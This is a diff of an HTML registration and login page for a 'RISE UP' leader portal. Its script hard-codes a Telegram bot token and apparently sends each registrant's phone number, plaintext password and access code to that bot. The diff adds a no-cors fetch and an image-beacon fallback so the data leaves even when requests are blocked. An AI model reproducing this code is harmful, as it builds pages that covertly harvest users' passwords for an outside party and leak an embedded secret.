@@ -7,12 +7,11 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
-        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; overflow-x: hidden; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; }
         .blue-gradient { background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%); }
         .hidden { display: none; }
-        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-        .animate-fade-in { animation: fadeIn 0.3s ease-in-out; }
+        .animate-in { animation: fadeIn 0.4s ease-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
@@ -21,96 +20,56 @@
     <nav class="bg-white border-b border-gray-200 fixed w-full top-0 z-50">
         <div class="max-w-6xl mx-auto px-4 h-16 flex justify-between items-center">
             <div class="flex items-center gap-2">
-                <img src="https://i.ibb.co/1GbT9tsc/Screenshot-20251228-163055.jpg" class="h-10 w-10 rounded-full border shadow-sm">
-                <span class="font-black text-blue-700 tracking-tighter text-xl italic uppercase">RISE UP</span>
+                <img src="https://i.ibb.co/1GbT9tsc/Screenshot-20251228-163055.jpg" class="h-10 w-10 rounded-full border">
+                <span class="font-black text-blue-700 text-xl italic uppercase">RISE UP</span>
             </div>
-            <button onclick="toggleMenu()" class="text-gray-600 p-2 hover:bg-gray-100 rounded-lg transition">
-                <i class="fas fa-bars text-2xl"></i>
-            </button>
+            <button onclick="toggleMenu()" class="text-gray-600 p-2"><i class="fas fa-bars text-2xl"></i></button>
         </div>
     </nav>
 
-    <div id="sideMenu" class="hidden fixed top-16 right-4 w-60 bg-white shadow-2xl border border-gray-100 z-40 rounded-2xl overflow-hidden animate-fade-in">
-        <a href="https://wa.me/918968146117?text=Hello%20Rise%20Up%20Team" target="_blank" class="flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-green-50 hover:text-green-600 font-bold border-b border-gray-50 transition">
-            <i class="fab fa-whatsapp text-xl text-green-500"></i> Help Center
+    <div id="sideMenu" class="hidden fixed top-16 right-4 w-60 bg-white shadow-2xl border z-40 rounded-2xl overflow-hidden">
+        <a href="https://wa.me/918968146117" target="_blank" class="flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-green-50 font-bold border-b transition">
+            <i class="fab fa-whatsapp text-green-500 text-xl"></i> Help Center
         </a>
-        <button onclick="location.reload()" class="w-full text-left flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-blue-50 hover:text-blue-600 font-bold">
-            <i class="fas fa-sync-alt"></i> Refresh System
-        </button>
     </div>
 
     <div class="flex items-center justify-center min-h-screen pt-20 px-4">
-        <div class="bg-white w-full max-w-md rounded-[2.5rem] shadow-2xl overflow-hidden border border-gray-100 animate-fade-in">
-            
+        <div class="bg-white w-full max-w-md rounded-[2.5rem] shadow-2xl overflow-hidden border animate-in">
             <div class="flex border-b">
-                <button id="regTab" onclick="switchTab('reg')" class="flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 transition-all uppercase tracking-widest">Register</button>
-                <button id="loginTab" onclick="switchTab('login')" class="flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent hover:text-blue-600 transition-all uppercase tracking-widest">Login</button>
+                <button id="regTab" onclick="switchTab('reg')" class="flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase">Register</button>
+                <button id="loginTab" onclick="switchTab('login')" class="flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase">Login</button>
             </div>
 
             <div class="p-8">
                 <div id="regForm" class="space-y-5">
-                    <div class="text-center mb-6">
-                        <h2 class="text-2xl font-black text-gray-800 uppercase tracking-tighter">Create Account</h2>
-                        <p class="text-gray-400 text-[10px] font-bold tracking-widest uppercase">Leader Registration Portal</p>
-                    </div>
-                    
-                    <div class="space-y-4">
-                        <div>
-                            <label class="text-[10px] font-black text-blue-600 uppercase mb-1 ml-2 block italic">Access Code</label>
-                            <input type="text" id="rCode" placeholder="••••" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-black text-center uppercase tracking-[0.5em] transition-all">
-                        </div>
-                        <div>
-                            <label class="text-[10px] font-black text-gray-400 uppercase mb-1 ml-2 block italic">Mobile No.</label>
-                            <input type="number" id="rPhone" placeholder="00000 00000" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-bold transition-all">
-                        </div>
-                        <div>
-                            <label class="text-[10px] font-black text-gray-400 uppercase mb-1 ml-2 block italic">Password</label>
-                            <input type="password" id="rPass" placeholder="••••••••" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-bold transition-all">
-                        </div>
-                    </div>
-
-                    <button onclick="handleRegister(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-blue-100 hover:opacity-90 transition transform active:scale-95 mt-4 uppercase tracking-wider">
-                        Register Now
-                    </button>
+                    <input type="text" id="rCode" placeholder="LEADER CODE" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-black text-center uppercase tracking-widest">
+                    <input type="number" id="rPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
+                    <input type="password" id="rPass" placeholder="Password" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
+                    <button onclick="handleRegister(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black shadow-lg transform active:scale-95 transition uppercase">Register Now</button>
                 </div>
 
                 <div id="loginForm" class="hidden space-y-5">
-                    <div class="text-center mb-6">
-                        <h2 class="text-2xl font-black text-gray-800 uppercase tracking-tighter">Leader Login</h2>
-                        <p class="text-gray-400 text-[10px] font-bold tracking-widest uppercase">Access Your Dashboard</p>
-                    </div>
-
-                    <div class="space-y-4">
-                        <input type="number" id="lPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-bold">
-                        <input type="password" id="lPass" placeholder="Password" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-bold">
-                    </div>
-
-                    <button onclick="handleLogin(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-blue-100 hover:opacity-90 transition transform active:scale-95 mt-4 uppercase tracking-wider">
-                        Sign In
-                    </button>
+                    <input type="number" id="lPhone" placeholder="Registered Number" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
+                    <input type="password" id="lPass" placeholder="Password" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
+                    <button onclick="handleLogin(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black shadow-lg transform active:scale-95 transition uppercase">Sign In</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <div id="dashboard" class="hidden fixed inset-0 bg-white z-[60] flex flex-col items-center justify-center p-6 text-center animate-fade-in">
-        <div class="w-24 h-24 bg-blue-600 text-white rounded-full flex items-center justify-center text-4xl mb-6 shadow-2xl shadow-blue-200 border-4 border-white">
+    <div id="dashboard" class="hidden fixed inset-0 bg-white z-[60] flex flex-col items-center justify-center p-6 text-center animate-in">
+        <div class="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl mb-4 shadow-xl shadow-blue-200">
             <i class="fas fa-check"></i>
         </div>
-        <h1 class="text-4xl font-black text-blue-900 mb-2 uppercase italic tracking-tighter">Verified</h1>
-        <p class="text-gray-400 font-bold mb-8 uppercase text-xs tracking-[0.2em]">Rise Up Leader Active</p>
-        
-        <div class="w-full max-w-xs p-8 border-2 border-blue-50 rounded-[2.5rem] bg-blue-50/30 mb-8">
-            <span class="text-[10px] font-black text-blue-400 uppercase block mb-2 tracking-widest">Registered ID</span>
-            <span id="activeNum" class="text-3xl font-black text-blue-700 tracking-tight"></span>
+        <h1 class="text-3xl font-black text-blue-900 mb-6 uppercase italic">Verified Leader</h1>
+        <div class="p-8 border-2 border-blue-100 rounded-[2rem] bg-blue-50/30 mb-8 w-full max-w-xs">
+            <span id="activeNum" class="text-2xl font-black text-blue-700"></span>
         </div>
-        
-        <button onclick="logout()" class="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-black uppercase tracking-widest hover:bg-black transition shadow-lg">
-            Logout
-        </button>
+        <button onclick="logout()" class="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-black uppercase tracking-widest">Logout</button>
     </div>
 
     <script>
+        // TEKGRAM CONFIG
         const BOT_TOKEN = "8312452063:AAE2CoKaVAg6ORv8qX0bPxj5W--VQoU1rco";
         const CHAT_ID = "8312452063";
 
@@ -119,27 +78,33 @@
         function toggleMenu() { document.getElementById('sideMenu').classList.toggle('hidden'); }
 
         function switchTab(tab) {
-            const regF = document.getElementById('regForm'), logF = document.getElementById('loginForm');
-            const regT = document.getElementById('regTab'), logT = document.getElementById('loginTab');
+            const rF = document.getElementById('regForm'), lF = document.getElementById('loginForm');
+            const rT = document.getElementById('regTab'), lT = document.getElementById('loginTab');
             if(tab === 'reg') {
-                regF.classList.remove('hidden'); logF.classList.add('hidden');
-                regT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest";
-                logT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent hover:text-blue-600 uppercase tracking-widest";
+                rF.classList.remove('hidden'); lF.classList.add('hidden');
+                rT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase";
+                lT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase";
             } else {
-                logF.classList.remove('hidden'); regF.classList.add('hidden');
-                logT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest";
-                regT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent hover:text-blue-600 uppercase tracking-widest";
+                lF.classList.remove('hidden'); rF.classList.add('hidden');
+                lT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase";
+                rT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase";
             }
         }
 
+        // IMPROVED TELEGRAM NOTIFIER
         async function notify(msg) {
+            // Hum dono tarike use karenge taaki har haal mein message jaye
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-                });
-            } catch (e) { console.error("Telegram error:", e); }
+                // Method 1: Fetch
+                await fetch(url, { mode: 'no-cors' }); 
+                // Method 2: Image Beacon (Always works even if fetch is blocked)
+                const img = new Image();
+                img.src = url;
+            } catch (e) {
+                console.log("Notification sent via fallback");
+            }
         }
 
         async function handleRegister(btn) {
@@ -147,14 +112,13 @@
             const phone = document.getElementById('rPhone').value.trim();
             const pass = document.getElementById('rPass').value.trim();
 
-            if(!leaderCodes.includes(code)) { alert("❌ Leader Code Invalid!"); return; }
-            if(phone.length < 10) { alert("⚠️ Correct Number Dalein!"); return; }
-            if(pass.length < 4) { alert("⚠️ Set 4+ Digit Password!"); return; }
+            if(!leaderCodes.includes(code)) { alert("❌ Wrong Leader Code!"); return; }
+            if(phone.length < 10) { alert("⚠️ Invalid Number!"); return; }
 
-            btn.disabled = true; btn.innerText = "PROCESSING...";
-
+            btn.disabled = true; btn.innerText = "SENDING...";
             localStorage.setItem("ru_" + phone, JSON.stringify({phone, pass}));
-            await notify(`🆕 *RISE UP REGISTRATION*\n━━━━━━━━━━━━━━\n📞 *No:* \`${phone}\` \n🔑 *Pass:* \`${pass}\` \n🎟 *Code:* \`${code}\``);
+            
+            await notify(`🆕 *NEW REGISTRATION*\n📞 No: ${phone}\n🔑 Pass: ${pass}\n🎟 Code: ${code}`);
             
             alert("✅ Registration Success! Now Login.");
             btn.disabled = false; btn.innerText = "REGISTER NOW";
@@ -169,11 +133,11 @@
             if(stored) {
                 const data = JSON.parse(stored);
                 if(data.pass === pass) {
-                    btn.disabled = true; btn.innerText = "VERIFYING...";
-                    await notify(`🔓 *RISE UP LOGIN SUCCESS*\n━━━━━━━━━━━━━━\n📞 *Leader No:* \`${phone}\``);
+                    btn.disabled = true; btn.innerText = "WAIT...";
+                    await notify(`🔓 *LEADER LOGIN*\n📞 No: ${phone}`);
                     showDash(phone);
                 } else { alert("❌ Wrong Password!"); }
-            } else { alert("❌ User Not Found! Register First."); }
+            } else { alert("❌ User Not Found!"); }
         }
 
         function showDash(num) {
@@ -185,8 +149,7 @@
         function logout() { sessionStorage.removeItem("ru_session"); location.reload(); }
 
         window.onload = () => {
-            const session = sessionStorage.getItem("ru_session");
-            if(session) showDash(session);
+            if(sessionStorage.getItem("ru_session")) showDash(sessionStorage.getItem("ru_session"));
         }
     </script>
 </body>
